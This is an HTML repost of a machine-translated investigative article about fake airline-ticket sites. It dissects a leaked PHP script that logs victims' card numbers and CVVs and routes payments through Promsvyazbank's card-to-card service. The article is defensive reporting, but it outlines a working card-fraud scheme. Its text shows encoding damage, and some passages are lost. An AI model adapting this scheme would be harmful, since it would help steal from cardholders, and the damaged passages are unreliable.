<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸŠ ğŸ™‡ğŸ¾ ğŸ˜œ Vols pas chers ... Un rÃ©seau de sites Web frauduleux volant de l'argent des cartes. La deuxiÃ¨me enquÃªte. Qu'est-ce que Promsvyazbank a Ã  voir avec cela? â™‚ï¸ ğŸ‘ƒğŸ¾ ğŸ¦</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Il y a environ un mois, j'ai publiÃ© un article sur Geektimes, Â«Billets d'avion bon marchÃ© ... Ou un rÃ©seau de sites frauduleux qui volent de l'argent ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Vols pas chers ... Un rÃ©seau de sites Web frauduleux volant de l'argent des cartes. La deuxiÃ¨me enquÃªte. Qu'est-ce que Promsvyazbank a Ã  voir avec cela?</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/398313/"><img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il y a environ un mois, j'ai publiÃ© un article sur Geektimes, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Â«Billets d'avion bon marchÃ© ... Ou un rÃ©seau de sites frauduleux qui volent de l'argent des cartes. </font><font style="vertical-align: inherit;">Mon enquÃªte. " </font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">La publication a reÃ§u une excellente rÃ©ponse et une suite inattendue ...</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Permettez-moi de vous rappeler pour ceux qui n'ont pas lu la premiÃ¨re partie. Dans une publication basÃ©e sur des cas rÃ©els, des stratagÃ¨mes ont Ã©tÃ© dÃ©crits utilisant des fraudeurs qui volent de l'argent sur les billets d'acheteurs de billets d'avion qui Ã©taient imprudents pour se rendre sur un faux site de vente de billets. Le nombre de ces sites frauduleux pour la vente de billets d'avion sur RuNet est de plusieurs dizaines et centaines (y compris fermÃ©s). Sur ces sites, l'utilisateur voit d'abord des informations rÃ©elles sur les vols, il est proposÃ© de passer une commande et de la payer avec une carte de crÃ©dit. Tout est beau jusqu'Ã  ce que les acheteurs de billets d'avion dÃ©couvrent qu'ils se retrouvent sans argent et sans billets.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans tous les cas dÃ©tectÃ©s, pour voler de l'argent, ces sites utilisent les services des banques pour transfÃ©rer de l'argent de carte Ã  carte (P2P). Dans la premiÃ¨re partie, le mÃ©canisme de la faÃ§on dont la page de la Banque Tinkov pour le paiement de carte Ã  carte est dÃ©guisÃ©e et intÃ©grÃ©e dans des sites Web frauduleux, de sorte que Â«l'acheteurÂ» ne remarque rien, a Ã©tÃ© dÃ©crit en dÃ©tail. Promsvyazbank a Ã©galement Ã©tÃ© mentionnÃ©e - c'est par lui que l'argent a Ã©tÃ© volÃ© sur la carte de la victime dans l'histoire qui a Ã©tÃ© dÃ©crite. Et s'il n'y avait pas de questions laissÃ©es Ã  la banque TKS, alors dans le cas de Promsvyazbank, il n'Ã©tait pas clair comment l'argent Ã©tait retirÃ©. Le script principal utilisÃ© pour voler de l'argent a Ã©tÃ© exÃ©cutÃ© cÃ´tÃ© serveur et sans code source, on ne pouvait que supposer ce qu'il faisait.</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Et l'un des utilisateurs de Geektimes m'a contactÃ© et m'a envoyÃ© le script trÃ¨s payp2p.php qui a Ã©tÃ© utilisÃ© rÃ©cemment sur la plupart des sites de vente de billets d'avion frauduleux. </font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ce script utilise le service Promsvyazbank pour transfÃ©rer de carte en carte. </font><font style="vertical-align: inherit;">Et Ã  mon avis, Promsvyazbank, fournissant son service, qui Ã©tait facile Ã  tromper, a contribuÃ© Ã  la croissance du nombre de fraudeurs sur Internet.</font></font><a name="habracut"></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il existe probablement d'autres banques similaires, mais cette publication traitera principalement de Promsvyazbank. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Avant de commencer l'analyse du script lui-mÃªme, voyons Ã  quoi ressemblait la page de paiement d'un site Web frauduleux et Ã  quoi ressemble la page de traduction d'une carte Ã  une carte Promsvyazbank. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cela ressemblait Ã  la page de paiement sur les sites frauduleux</font></font><br>
<img src="https://habrastorage.org/files/fe3/cf3/6d5/fe3cf36d5d294c8aa50b4338e9efde03.jpg"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Lors de l'analyse du code HTML de cette page de paiement, je n'ai trouvÃ© aucune partie des pages des banques, les iframes intÃ©grÃ©s ne sont pas utilisÃ©s, les scripts ne sont pas utilisÃ©s du tout et la page elle-mÃªme est trÃ¨s simple et ne ressemble pas Ã  la page de Promsvyazbank. Les donnÃ©es saisies dans le formulaire ne sont pas vÃ©rifiÃ©es par des scripts, mais par des mÃ©canismes intÃ©grÃ©s dans les navigateurs - en utilisant les attributs Â«patternÂ» et Â«requiredÂ» pour les champs de saisie et pour les listes dÃ©roulantes sÃ©lectionnÃ©es. C'est-Ã -dire mÃªme la page stockÃ©e dans le navigateur sur le disque local reste alors Â«opÃ©rationnelleÂ» et peut Ãªtre utilisÃ©e pour tester comment les donnÃ©es cartographiques sont interceptÃ©es. Une page similaire enregistrÃ©e prÃ©cÃ©demment a Ã©tÃ© utilisÃ©e dans le cadre de cette publication afin de comprendre le fonctionnement du script.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En fait, cette page est juste un formulaire pour entrer un numÃ©ro de carte. </font><font style="vertical-align: inherit;">Une fois le formulaire confirmÃ©, le traitement est transfÃ©rÃ© vers le programme payp2p.php.</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"b-card-feature-list clearfix"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"formPay"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"payp2p.php"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Payp2p.php peut tout faire. </font><font style="vertical-align: inherit;">Son code Ã©tait auparavant indisponible pour nous, car il s'exÃ©cute cÃ´tÃ© serveur. </font><font style="vertical-align: inherit;">Mais comme je l'ai dÃ©jÃ  Ã©crit, nous avons maintenant un code, et nous saurons tout. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons maintenant Ã  quoi ressemble la page de paiement de carte en carte sur le site de Promsvyazbank. </font></font><br>
<br>
<code>https://www.psbank.ru/Personal/eCommerce/Card2Card</code><br>
<img src="https://habrastorage.org/files/40d/469/71c/40d46971c2414e28bd4ef695c1e0d665.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comme vous pouvez le voir, la page Promsvyazbank ne ressemble pas du tout Ã  la page de paiement prÃ©sentÃ©e prÃ©cÃ©demment. </font><font style="vertical-align: inherit;">MÃªme le nombre de champs de saisie pour le numÃ©ro de carte ne correspond pas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Examinons le code HTML de la page PSB pour comprendre comment cela fonctionne. </font><font style="vertical-align: inherit;">Tout ce que nous devons savoir est dans ces quelques lignes:</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"card2card"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/P2P/card_form.html"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameborder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">seamless</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">scrolling</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette piÃ¨ce signifie que la vraie page de paiement est situÃ©e sur un domaine diffÃ©rent, et ce que nous voyons sur le site Web de Promsvyazbank est affichÃ© dans une Â«fenÃªtreÂ» utilisant la technologie iframe. </font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Je me demande Ã  qui appartient le domaine 3ds.payment.ru.</font></font></b><div class="spoiler_text">   Whois.<br>
<br>
<code> 3ds.payment.ru<br>
IP 193.200.10.116<br>
 : PRSBM-NET <br>
:<br>
inetnum: 193.200.10.0 - 193.200.10.255<br>
netname: PRSBM-NET<br>
mnt-by: PROMSVYAZBANK-MNT<br>
<br>
C    online.payment.ru<br>
<img src="https://habrastorage.org/files/78b/0d3/8be/78b0d38be13f47f58128095526817a54.png"><br>
</code><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le domaine 3ds.payment.ru appartient Ã©galement Ã  Promsvyazbank. Nous nous souviendrons de ce domaine, il se retrouvera plus d'une fois dans la description. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons quelle est la page que Promsvyazbank intÃ¨gre sur son site, et Ã©ventuellement sur d'autres sites. </font></font><br>
<br>
<code>https://3ds.payment.ru/P2P/card_form.html</code><br>
<img src="https://habrastorage.org/files/bf7/543/441/bf754344157647e1acf1fb55454c3179.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il s'agit d'une vÃ©ritable page utilisÃ©e pour les transferts de carte en carte. Comme vous pouvez le voir, cette page est sans bordure. Ceci est fait exprÃ¨s pour le rendre plus pratique Ã  construire dans d'autres sites. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans le code HTML de cette page, nous sommes intÃ©ressÃ©s par cette partie: </font></font><br>
<br>
<img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ce sont des champs de saisie cachÃ©s pour stocker les informations de service. Nous nous souviendrons Ã©galement de cette page. Et oÃ¹ il est utilisÃ© sera dÃ©crit plus tard. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La partie introductive est terminÃ©e, passons Ã  la partie la plus intÃ©ressante et voyons comment fonctionne le script payp2p.php ou comment il a fonctionnÃ©.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le script est simple et ne nÃ©cessite aucune connaissance approfondie du langage de programmation PHP pour le comprendre. Pour plus de commoditÃ©, je l'ai cassÃ© en morceaux. Ã€ gauche, les numÃ©ros de ligne qui peuvent Ãªtre rÃ©fÃ©rencÃ©s. Le script est complÃ¨tement inchangÃ© sous la forme dans laquelle il a Ã©tÃ© reÃ§u. AprÃ¨s chaque morceau de code, un dÃ©chiffrement et un exemple des valeurs des variables pendant l'exÃ©cution du programme seront prÃ©sentÃ©s (c'est-Ã -dire quelque chose de similaire au dÃ©bogage). Dans certains endroits, des commentaires excessifs sont possibles - cela est fait pour que les lecteurs hors programmation puissent Ã©galement comprendre la signification du code de programme.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pour les tests, nous avons besoin d'un formulaire dans lequel vous devrez saisir les donnÃ©es de la carte avec lesquelles le paiement est supposÃ©. Nous utiliserons le formulaire enregistrÃ© prÃ©cÃ©demment. L'aspect du formulaire sur un site frauduleux est illustrÃ© dans l'image au dÃ©but de l'article. Le formulaire sera Ã©crit plus loin ci-dessous. Pour les tests, entrez le numÃ©ro de carte 1111.2222.3333.4444. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
CommenÃ§ons. </font></font><br>
<br>
<img src="https://habrastorage.org/files/f45/3a9/754/f453a9754241406eb6089527f5e25336.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 3 - n'exÃ©cute aucune commande. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 4 - Un fichier dbconfig.php distinct est chargÃ© dans lequel les paramÃ¨tres de connexion Ã  la base de donnÃ©es MySQL sont stockÃ©s. Une capture d'Ã©cran du code dbconfig.php et son analyse sont ci-dessous.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 6 - nous nous connectons au serveur MySQL, dans la base de donnÃ©es dont nous stockons ensuite les donnÃ©es sur les cartes volÃ©es et les transferts d'argent effectuÃ©s. Cette ligne se connecte simultanÃ©ment au serveur MySQL et quitte le programme si la connexion a Ã©chouÃ© pour une raison quelconque. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 11 - sÃ©lectionnez l'encodage pour travailler avec la base de donnÃ©es MySQL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 13 - Nous nous sommes connectÃ©s au serveur MySQL plus tÃ´t, maintenant nous sÃ©lectionnons la base de donnÃ©es avec laquelle nous travaillerons. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le script payp2p.php commence son travail aprÃ¨s qu'un utilisateur trompÃ© a rempli un formulaire sur une page similaire Ã  une page de paiement en ligne classique. En cliquant sur le bouton Â«PayerÂ» du formulaire, le script payp2p.php reÃ§oit les donnÃ©es saisies dans le formulaire. Les donnÃ©es du formulaire au script sont transmises Ã  l'aide de la mÃ©thode POST.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 16 - le numÃ©ro de carte de crÃ©dit entrÃ© dans le formulaire de la page prÃ©cÃ©dente est enregistrÃ© dans la variable $ num. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 17 - le mois / l'annÃ©e de la pÃ©riode de validitÃ© de la carte est stockÃ© dans la variable $ date. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 18 - Le code CVV de la carte est enregistrÃ© dans la variable $ cvv. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 19 - dans la variable $ code, un certain code est gÃ©nÃ©rÃ© plus tÃ´t lors de la passation de la Â«commande de billets d'avionÂ». Ce code est utilisÃ© pour que l'utilisateur puisse visualiser sa commande via un lien spÃ©cial. Le mÃªme code est utilisÃ© pour identifier la commande (sur la page de paiement, pour afficher automatiquement le montant du paiement; s'il est enregistrÃ© par les escrocs lors de l'enregistrement dans le Â«livre des ventesÂ»; ce code est Ã©galement transmis au formulaire de paiement, probablement comme identifiant de transfert (voir ci-dessous).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 21-22 Une ligne est formÃ©e - une requÃªte SQL, qui est ensuite exÃ©cutÃ©e. </font><font style="vertical-align: inherit;">La requÃªte SQL ajoute les valeurs de l'identifiant de commande, du montant, de la date d'expiration de la carte, du code CVV de la carte et de l'heure actuelle exacte Ã  la table Â«carteÂ». </font><font style="vertical-align: inherit;">Un exemple d'enregistrement dans la base de donnÃ©es est ci-dessous.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemple d'informations de dÃ©bogage</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/051/283/424/0512834248fd4c1fa7498ed3f98e72e7.png"><br>
<br>
        Â« Â»      Â« Â».    ,     .    .<br>
<br>
"Ã¢Ã¡Ã¨Ã¢" = ''    ISO8859-1 =&gt;Windows-1251<br>
  ,  .  .</div></div> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tournez temporairement notre attention temporairement sur le fichier dbconfig.php. </font></font><br>
<br>
<img src="https://habrastorage.org/files/100/d2a/13b/100d2a13b3544f60afeeab0efc768b85.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voici les paramÃ¨tres de connexion Ã  la base de donnÃ©es. </font><font style="vertical-align: inherit;">D'aprÃ¨s ce qui peut Ãªtre intÃ©ressant:</font></font><br>
<br>
<blockquote>DBHOST â€”  ,    MySQL  (    MySQL     ,     ,       )<br>
DBNAME â€”   <br>
DBUSER â€”        MySQL<br>
DBPASS â€”       MySQL <br>
SECURE_AUTH_KEY â€”      -   .      ,   ,    , .     .</blockquote><br>
<img src="https://habrastorage.org/files/c5c/9bf/0b1/c5c9bf0b1afb4d8ba298ce8953076dee.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 28 - un fichier aviacfg.php tiers est connectÃ©. Il s'agit d'un fichier de configuration qui stocke les numÃ©ros de carte des destinataires et d'autres paramÃ¨tres. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 29 - Un tableau est crÃ©Ã© Ã  partir des numÃ©ros de carte sÃ©parÃ©s par un saut de ligne dans le fichier de configuration. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 30-31 - La variable $ crd se voit attribuer au hasard le numÃ©ro d'une des cartes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons ce que nous avons dans le fichier aviacfg.php</font></font><br>
<br>
<img src="https://habrastorage.org/files/14b/2bd/b16/14b2bdb16dc74b7990b743146d9bc72c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ici, nous voyons que la variable $ aviacfg est un tableau qui contient les valeurs de remise (remise) et de cartes (numÃ©ros de carte pour lesquels des retraits sont attendus). Dans cet exemple, il n'y a qu'un seul numÃ©ro de carte, mais il peut y en avoir n'importe quel nombre. Le nom du fichier (aviacfg.php) et la variable ($ aviacfg) lui-mÃªme indiquent pour quelle zone ce script a Ã©tÃ© affinÃ©. La valeur de la remise dÃ©termine le pourcentage des prix sur un site Web frauduleux qui sera affichÃ© moins cher qu'ils ne sont rÃ©ellement vendus sur un site Web de billets d'avion Â«honnÃªteÂ». Le propriÃ©taire d'un site Web frauduleux peut rapidement rÃ©duire le prix affichÃ© des billets. Plus le prix affichÃ© est bas, plus il est probable que l'un des acheteurs potentiels risque d'acheter des billets sur un site inconnu. Ã€ propos de la remise, il y aura un commentaire plus tard sur la faÃ§on dont elle est implÃ©mentÃ©e dans le code.</font></font><br>
<br>
<img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De plus, le montant du transfert, le numÃ©ro de la carte vers laquelle le transfert est effectuÃ© et le code qui identifie la commande de billets d'avion sur un site Web frauduleux sont stockÃ©s dans la base de donnÃ©es MySQL. </font><font style="vertical-align: inherit;">Un exemple d'enregistrement dans la base de donnÃ©es sera prÃ©sentÃ© ci-dessous.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemple d'informations de dÃ©bogage</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/4ee/0e7/b46/4ee0e7b46d584bb68631adb4339b86e9.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/111/e13/e09/111e13e09e2246b4bbb9a3cdb6cab651.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 40 - la variable $ p112 se voit attribuer une valeur avec le numÃ©ro de carte entrÃ© prÃ©cÃ©demment dans le formulaire. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 41-51 - Le numÃ©ro de carte est divisÃ© en parties de quatre chiffres. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 53-57 - La longueur du numÃ©ro de carte est vÃ©rifiÃ©e. Si dans le numÃ©ro de carte le nombre de caractÃ¨res diffÃ¨re de 16 ou 18, une sortie se produit. Un message s'affiche pendant cinq secondes, puis redirigÃ© vers une autre page. Dans cet exemple, le retour se fera sur la page de commande du site frauduleux. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ã€ la ligne 56 "Iaaa? Iua aaiiua ea? Ou" lors de la conversion du codage ISO8859-1 =&gt; Windows-1251 correspond au texte: "DonnÃ©es de carte non valides". </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 58-61 - les variables $ p4, $ p5, $ p6, $ p11 reÃ§oivent les valeurs saisies plus tÃ´t dans le formulaire (date d'expiration de la carte, code CVV, montant du paiement).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ligne 63 - Dans la variable $ info, toutes les donnÃ©es de la carte et le montant du transfert sont enregistrÃ©s. </font><font style="vertical-align: inherit;">Lors de la formation, les sauts de ligne "\ n" et les sÃ©parateurs "### ..." sont utilisÃ©s. </font><font style="vertical-align: inherit;">Cette variable n'est utilisÃ©e nulle part ailleurs. </font><font style="vertical-align: inherit;">Lors de la finalisation du script, il peut Ãªtre utilisÃ© pour enregistrer des enregistrements dans un fichier texte normal ou pour l'afficher pendant le dÃ©bogage.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemple d'informations de dÃ©bogage</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/413/f55/39d/413f5539d0fa45f3aee1853c62d0005f.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/347/9f7/0d5/3479f70d54804bb2b25f111021820c1c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lignes 66-75 - Il s'agit en fait d'une duplication du bloc de lignes 27-36. Encore une fois, la carte rÃ©ceptrice est sÃ©lectionnÃ©e au hasard dans le fichier de configuration aviacfg.php, et tout cela est enregistrÃ© dans la table de base de donnÃ©es card_balance. Ainsi, dans la table card_balance, Ã  chaque tentative de transfert, deux enregistrements seront crÃ©Ã©s. Si une seule carte de destinataire est obstruÃ©e dans aviacfg.php, avec un Ã©chantillonnage alÃ©atoire, bien sÃ»r, la mÃªme carte sera toujours sÃ©lectionnÃ©e. Dans ce cas, les entrÃ©es de la table card_balance seront simplement dupliquÃ©es. Mais si plusieurs numÃ©ros de carte sont bouchÃ©s dans aviacfg.php, avec un Ã©chantillonnage alÃ©atoire, les rÃ©sultats seront diffÃ©rents et il y aura un enregistrement dans la table card_balance, le premier est incorrect et le second est correct.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
C'est une erreur, et les acheteurs du script (il y aura un commentaire sÃ©parÃ© Ã  leur sujet) peuvent demander au dÃ©veloppeur de compenser le prÃ©judice moral associÃ© au fait que les traductions rÃ©elles sont au moins deux fois moins que les entrÃ©es de journal.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemple d'informations de dÃ©bogage</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/33b/867/4db/33b8674db56f462ba652d8caf33b418a.png"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemples d'entrÃ©es de base de donnÃ©es MySQL</font></font></b><div class="spoiler_text">        .           : Â«cardÂ»  Â«card_balanceÂ».               ,             .<br>
<br>
,         , â€”   .      .<br>
<br>
 Â«cardÂ».<br>
<br>
<img src="https://habrastorage.org/files/4e9/e3c/454/4e9e3c45420a4d84b73a857184fe7155.jpg"><br>
<br>
 Â«card_balanceÂ».<br>
<img src="https://habrastorage.org/files/98c/4a0/355/98c4a03559ba40e8a46adb2fdf950b54.jpg"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Veuillez noter que dans le premier cas, seules les cartes d'expÃ©diteur sans montant, mais avec l'heure exacte, sont stockÃ©es dans la table de base de donnÃ©es MySQL, et dans le second cas, les donnÃ©es sur les transferts effectuÃ©s (plus prÃ©cisÃ©ment, sur les tentatives de transferts) sont enregistrÃ©es. </font><font style="vertical-align: inherit;">Le numÃ©ro et le montant de la carte du destinataire sont enregistrÃ©s, les donnÃ©es de l'expÃ©diteur ne sont pas enregistrÃ©es dans le deuxiÃ¨me tableau. </font><font style="vertical-align: inherit;">Dans les deux cas, l'ID de commande est Ã©galement enregistrÃ©.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La premiÃ¨re partie du script, qui a Ã©tÃ© dÃ©crite ci-dessus, peut Ãªtre arbitrairement appelÃ©e Â«entrÃ©e dans le livre des ventes pour la comptabilitÃ©Â». Elle n'a aucun lien avec le transfert d'argent. Pour transfÃ©rer de l'argent, vous pouvez vous passer de l'enregistrement des donnÃ©es dans la base de donnÃ©es. NÃ©anmoins, nous constatons que les donnÃ©es de la carte sont enregistrÃ©es, ce qui signifie qu'Ã  l'avenir, elles pourront Ãªtre utilisÃ©es pour voler de l'argent aux cartes Â«en mode manuelÂ». Les donnÃ©es de la carte peuvent Ãªtre vendues ou utilisÃ©es, par exemple, pour payer la publicitÃ© dans Yandex.Direct, comme indiquÃ© dans l'article prÃ©cÃ©dent. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La deuxiÃ¨me partie du script concerne le transfert d'argent via le site de Promsvyazbank 3ds.payment.ru. </font></font><br>
<br>
<img src="https://habrastorage.org/files/2b4/0cb/7fc/2b40cb7fc61f4b9598409fbfcc5ae00f.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La ligne 78 du commentaire indique qu'il est supposÃ© que la page de confirmation pour un paiement rÃ©ussi a une adresse comme "/sus.php?cd=BX3FKT". En cas de succÃ¨s, l'utilisateur doit Ãªtre renvoyÃ© Ã  cette adresse.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
